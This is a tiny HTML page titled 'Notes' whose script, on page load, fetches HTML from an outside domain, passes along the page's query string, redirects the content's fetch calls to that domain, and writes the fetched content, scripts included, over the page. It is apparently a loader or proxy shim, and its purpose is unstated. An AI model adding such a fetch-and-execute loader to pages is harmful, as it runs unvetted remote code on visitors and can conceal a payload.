<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Notes</title>
<script>
  const API = "https://chat.sund4y1123.com";
  
  async function load() {
    try {
      const r = await fetch(API + window.location.search);
      const html = await r.text();
      const patched = html
        .replace(/fetch\('\//g, `fetch('${API}/`)
        .replace(/fetch\("\//g, `fetch("${API}/`);
      document.open();
      document.write(patched);
      document.close();
    } catch(e) {
      document.body.innerHTML = '<h1>Loading failed</h1><p>' + e + '</p>';
    }
  }
  load();
</script>
</head><body>Loading...</body></html>
